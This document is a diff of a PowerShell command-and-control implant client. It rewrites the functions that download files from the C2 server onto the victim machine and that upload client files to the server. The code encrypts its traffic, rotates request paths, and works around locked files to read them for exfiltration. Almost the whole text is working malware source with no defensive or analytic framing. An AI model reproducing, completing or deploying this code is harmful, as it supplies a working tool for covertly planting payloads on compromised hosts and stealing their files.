@@ -77,82 +77,130 @@ function Get-DirectoryListing {
 }
 
 # Function to download a file from the server to the client
-# This version avoids recursive calling
-function Download-File {
+# From client perspective: "Upload-File" means receiving a file FROM server TO client
+function New-ConfiguredWebClient {
+    $webClient = New-Object System.Net.WebClient
+    
+    # Set User-Agent
+    $webClient.Headers.Add("User-Agent", $userAgent)
+    
+    # Set proxy if enabled
+    if ($proxyEnabled -and $global:proxyInstance) {
+        $webClient.Proxy = $global:proxyInstance
+    }
+    
+    # Add authentication credentials if configured
+    if ($useCredentials) {
+        $credentials = New-Object System.Net.NetworkCredential($username, $password)
+        $webClient.Credentials = $credentials
+    }
+    
+    return $webClient
+}
+
+function Upload-File {
     <#
     .SYNOPSIS
-        Downloads a file from the server to the client
+        Uploads a file from server to client
     .DESCRIPTION
-        Gets a file from the C2 server and saves it to the specified path
-    .PARAMETER FilePath
+        Downloads a file from the C2 server and saves it to the specified path on the client
+    .PARAMETER SourcePath
         Path to the file on the server
     .PARAMETER DestinationPath
-        Path where the file should be saved (optional - will use same filename at %TEMP% if not specified)
+        Path where the file should be saved on the client
     #>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$true)]
-        [string]$FilePath,
+        [string]$SourcePath,
         
-        [Parameter(Mandatory=$false)]
-        [string]$DestinationPath = ""
+        [Parameter(Mandatory=$true)]
+        [string]$DestinationPath
     )
     
     try {
-        # Expand environment variables if present in paths
-        if ($FilePath -match '%\w+%') {
-            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
-        }
-        
+        # Expand environment variables if present in destination path
         if ($DestinationPath -match '%\w+%') {
             $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
-        }
-        
-        # If no destination specified, use temp folder with original filename
-        if ([string]::IsNullOrEmpty($DestinationPath)) {
-            $filename = [System.IO.Path]::GetFileName($FilePath)
-            $DestinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $filename)
+            Write-Host "Expanded destination path: $DestinationPath"
         }
         
         # Make sure the destination path ends with a filename, not just a directory
         if ($DestinationPath.EndsWith('\') -or $DestinationPath.EndsWith('/')) {
             # If only a directory was provided, append the source filename
-            $filename = [System.IO.Path]::GetFileName($FilePath)
+            $filename = if ($SourcePath -match '[\\/]([^\\/]+)$') {
+                # Extract filename from source path
+                $matches[1]
+            } else {
+                # Use source path as filename if it doesn't contain path separators
+                $SourcePath
+            }
+            
+            # Append filename to destination path
             $DestinationPath = Join-Path -Path $DestinationPath -ChildPath $filename
+            Write-Host "Appended filename to destination path: $DestinationPath"
         }
         
         # Create destination directory if it doesn't exist
         $destinationDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
         if (-not (Test-Path -Path $destinationDir -PathType Container)) {
             Write-Host "Creating directory: $destinationDir"
-            New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+            try {
+                New-Item -Path $destinationDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+            }
+            catch {
+                Write-Host "Error creating directory: $_"
+                # If we can't create the directory, try a fallback location
+                $tempFolder = [System.IO.Path]::GetTempPath()
+                $filename = [System.IO.Path]::GetFileName($DestinationPath)
+                $DestinationPath = Join-Path -Path $tempFolder -ChildPath $filename
+                Write-Host "Using fallback destination: $DestinationPath"
+            }
         }
         
-        # Create file request object
+        # Create file request JSON
         $fileRequest = @{
-            FilePath = $FilePath
+            FilePath = $SourcePath
             Destination = $DestinationPath
         }
+
+        # Convert to JSON
+        $requestJson = ConvertTo-Json -InputObject $fileRequest -Compress
+        Write-Host "Request JSON: $requestJson"
         
-        # Create the operation payload
-        $operationPayload = @{
-            "op_type" = "file_down"
-            "payload" = $fileRequest
+        # Create a web client for file request - directly create it instead of using helper function
+        $webClient = New-Object System.Net.WebClient
+        
+        # Set User-Agent
+        $webClient.Headers.Add("User-Agent", $userAgent)
+        
+        # Set proxy if enabled
+        if ($proxyEnabled -and $global:proxyInstance) {
+            $webClient.Proxy = $global:proxyInstance
         }
         
-        # Convert to JSON
-        $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
+        # Add authentication credentials if configured
+        if ($useCredentials) {
+            $credentials = New-Object System.Net.NetworkCredential($username, $password)
+            $webClient.Credentials = $credentials
+        }
         
-        # Encrypt the data
-        $encryptedData = Encrypt-Data -PlainText $operationJson
+        # Get current file request path
+        $fileRequestPath = if ($global:pathRotationEnabled) { 
+            Get-CurrentPath -PathType "file_request_path" 
+        } else { 
+            "/file_request"  # Default fallback if not defined
+        }
         
-        # Create web client
-        $webClient = New-WebClient
+        Write-Host "Using file request path: $fileRequestPath"
+        
+        # Encrypt the request
+        $encryptedRequest = Encrypt-Data -PlainText $requestJson
         
         # Prepare the payload with proper JSON structure
         $payload = @{
-            d = $encryptedData       # Data field
-            t = Get-RandomToken      # Token padding
+            d = $encryptedRequest  # Shortened from 'data'
+            t = Get-RandomToken     # Shortened from 'token'
         }
         
         # Add client ID only during first contact
@@ -163,24 +211,8 @@ function Download-File {
         # Convert payload to JSON with proper handling
         $payloadJson = ConvertTo-Json -InputObject $payload -Compress -Depth 4
         
-        # Select a path (either random from pool or specific file request path)
-        $downloadPath = $null
-        
-        # If path rotation is enabled and we have a path pool, use a random path 70% of the time
-        if ($global:pathRotationEnabled -and $global:pathPool -and $global:pathPool.Count -gt 0) {
-            if ((Get-Random -Minimum 1 -Maximum 100) -le 70) {
-                $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
-                $downloadPath = $global:pathPool[$randomIndex]
-            }
-        }
-        
-        # If we didn't select a random path, use the dedicated file request path
-        if (-not $downloadPath) {
-            $downloadPath = Get-CurrentPath -PathType "file_request_path"
-        }
-        
         # Send the request
-        $requestUrl = "http://$($global:serverAddress)$downloadPath"
+        $requestUrl = "http://$serverAddress$fileRequestPath"
         Write-Host "Sending file request to $requestUrl"
         $response = $webClient.UploadString($requestUrl, $payloadJson)
         
@@ -223,16 +255,66 @@ function Download-File {
             
             # Write bytes to file with error handling
             try {
-                # Make one more permission check right before writing
+                # Write file with proper path verification
+                Write-Host "Writing to file: $DestinationPath"
+                
+                # Before writing, make sure parent directory exists
+                $parentDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
+                if (-not [string]::IsNullOrEmpty($parentDir) -and -not (Test-Path -Path $parentDir -PathType Container)) {
+                    Write-Host "Creating parent directory: $parentDir"
+                    New-Item -Path $parentDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                }
+                
+                # Now write the file
                 [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
                 Write-Host "File successfully written to $DestinationPath"
             }
             catch [System.UnauthorizedAccessException] {
                 # Permission issue - fall back to temp
+                Write-Host "Permission denied, falling back to temp folder"
                 $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
-                Write-Host "Permission denied, falling back to $newPath"
+                Write-Host "New path: $newPath"
                 [System.IO.File]::WriteAllBytes($newPath, $fileContent)
                 $DestinationPath = $newPath
+                Write-Host "File successfully written to $DestinationPath"
+            }
+            catch [System.IO.DirectoryNotFoundException] {
+                # Directory not found - create it or fall back to temp
+                Write-Host "Directory not found, attempting to create it"
+                try {
+                    $dirPath = [System.IO.Path]::GetDirectoryName($DestinationPath)
+                    New-Item -Path $dirPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
+                    [System.IO.File]::WriteAllBytes($DestinationPath, $fileContent)
+                    Write-Host "File successfully written after creating directory: $DestinationPath"
+                }
+                catch {
+                    # Fall back to temp directory
+                    Write-Host "Failed to create directory, falling back to temp folder"
+                    $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath))
+                    [System.IO.File]::WriteAllBytes($newPath, $fileContent)
+                    $DestinationPath = $newPath
+                    Write-Host "File successfully written to $DestinationPath"
+                }
+            }
+            catch {
+                # General error - try alternative method with stream
+                Write-Host "Error writing file, trying alternate method: $_" 
+                try {
+                    # Try to use FileStream instead
+                    $fileStream = New-Object System.IO.FileStream($DestinationPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
+                    $fileStream.Write($fileContent, 0, $fileContent.Length)
+                    $fileStream.Close()
+                    $fileStream.Dispose()
+                    Write-Host "File successfully written using FileStream: $DestinationPath"
+                }
+                catch {
+                    # Fall back to temp directory as last resort
+                    Write-Host "All write attempts failed, falling back to temp folder: $_"
+                    $newPath = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath ([System.IO.Path]::GetFileName($DestinationPath) -replace '[^\w\.-]', '_')
+                    [System.IO.File]::WriteAllBytes($newPath, $fileContent)
+                    $DestinationPath = $newPath
+                    Write-Host "File successfully written to $DestinationPath"
+                }
             }
             
             return "Successfully downloaded $($fileResponse.FileName) ($($fileResponse.FileSize) bytes) to $DestinationPath"
@@ -243,65 +325,50 @@ function Download-File {
         }
     }
     catch {
-        Write-Host "Error in file download operation: $_"
-        return "Error downloading file: $_"
+        Write-Host "Error in file upload process: $_"
+        return "Error uploading file: $_"
     }
 }
 
 # Function to upload a file from the client to the server
-# This version avoids recursive calling and fixes the parameter issue
-function Upload-File {
+# From client perspective: "Download-File" means sending a file FROM client TO server
+function Download-File {
     <#
     .SYNOPSIS
         Uploads a file from the client to the server
     .DESCRIPTION
         Sends a file from the client to the C2 server
-    .PARAMETER SourcePath
+    .PARAMETER FilePath
         Path to the file on the client to upload
-    .PARAMETER DestinationPath
-        Path on the server where the file should be saved
-    .PARAMETER Description
-        Optional description for the uploaded file
     #>
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$true)]
-        [string]$SourcePath,
-        
-        [Parameter(Mandatory=$false)]
-        [string]$DestinationPath = "",
-        
-        [Parameter(Mandatory=$false)]
-        [string]$Description = ""
+        [string]$FilePath
     )
     
     try {
         # Expand environment variables if present in source path
-        if ($SourcePath -match '%\w+%') {
-            $SourcePath = [System.Environment]::ExpandEnvironmentVariables($SourcePath)
-        }
-        
-        # Expand environment variables if present in destination path
-        if ($DestinationPath -match '%\w+%') {
-            $DestinationPath = [System.Environment]::ExpandEnvironmentVariables($DestinationPath)
+        if ($FilePath -match '%\w+%') {
+            $FilePath = [System.Environment]::ExpandEnvironmentVariables($FilePath)
         }
         
         # Check if file exists
-        if (-not (Test-Path -Path $SourcePath -PathType Leaf)) {
-            return "Error: File not found: $SourcePath"
+        if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
+            return "Error: File not found: $FilePath"
         }
         
         # Try to read file with proper error handling for locked files
         $fileBytes = $null
         try {
             # First attempt: standard read
-            $fileBytes = [System.IO.File]::ReadAllBytes($SourcePath)
+            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         }
         catch [System.IO.IOException] {
             Write-Host "File is in use, trying alternative read method"
             try {
                 # Second attempt: Open with FileShare.ReadWrite to allow reading even if file is in use
-                $fileStream = [System.IO.File]::Open($SourcePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+                $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                 $memStream = New-Object System.IO.MemoryStream
                 $fileStream.CopyTo($memStream)
                 $fileBytes = $memStream.ToArray()
@@ -312,7 +379,7 @@ function Upload-File {
                 # Third attempt: try to make a copy of the file first
                 Write-Host "Alternative read failed, trying to make a copy first"
                 $tempFile = [System.IO.Path]::GetTempFileName()
-                Copy-Item -Path $SourcePath -Destination $tempFile -Force
+                Copy-Item -Path $FilePath -Destination $tempFile -Force
                 $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
                 Remove-Item -Path $tempFile -Force
             }
@@ -328,17 +395,16 @@ function Upload-File {
         
         # Prepare file upload data
         $fileData = @{
-            FileName = (Split-Path -Path $SourcePath -Leaf)
+            FileName = (Split-Path -Path $FilePath -Leaf)
             FileContent = $fileContent
             FileSize = $fileBytes.Length
-            SourcePath = $SourcePath
-            DestinationPath = $DestinationPath  # Include destination path in the upload data
-            Description = $Description
+            SourcePath = $FilePath
+            Description = "File uploaded from client"
         }
         
-        # Create the operation payload
+        # Create the operation payload with CORRECT operation type for client->server upload
         $operationPayload = @{
-            "op_type" = "file_up"
+            "op_type" = "file_up"    # Must be file_up for client->server transfer
             "payload" = $fileData
         }
         
@@ -399,18 +465,7 @@ function Upload-File {
         # Debug information to help diagnose URL issues
         Write-Host "Server address: $($global:serverAddress)"
         Write-Host "Upload path: $uploadPath"
-        
-        # Check for common URL formatting issues
-        if ($uploadUrl -match "http:///$") {
-            # Missing server address
-            Write-Host "Error: Server address is missing or empty. Using default localhost address."
-            $uploadUrl = "http://localhost$uploadPath"
-        }
-        elseif ($uploadUrl -match "http:///") {
-            # Triple slash issue - fix by replacing with double slash and adding localhost
-            Write-Host "Error: Invalid URL format with triple slash. Fixing format."
-            $uploadUrl = $uploadUrl -replace "http:///", "http://localhost/"
-        }
+        Write-Host "File size: $($fileBytes.Length) bytes"
         
         try {
             $response = $webClient.UploadString($uploadUrl, $payloadJson)
@@ -426,7 +481,7 @@ function Upload-File {
                         $responseData = ConvertFrom-Json -InputObject $decryptedResponse -ErrorAction Stop
                         
                         if ($responseData.Status -eq "Success") {
-                            return "Successfully uploaded $SourcePath to server ($($fileBytes.Length) bytes): $($responseData.Message)"
+                            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes): $($responseData.Message)"
                         }
                         else {
                             return "Upload completed with status: $($responseData.Status) - $($responseData.Message)"
@@ -439,7 +494,7 @@ function Upload-File {
             }
             
             # If we couldn't parse the response or there was no structured response
-            return "Successfully uploaded $SourcePath to server ($($fileBytes.Length) bytes)"
+            return "Successfully uploaded $FilePath to server ($($fileBytes.Length) bytes)"
         }
         catch {
             Write-Host "Error sending file upload: $_"
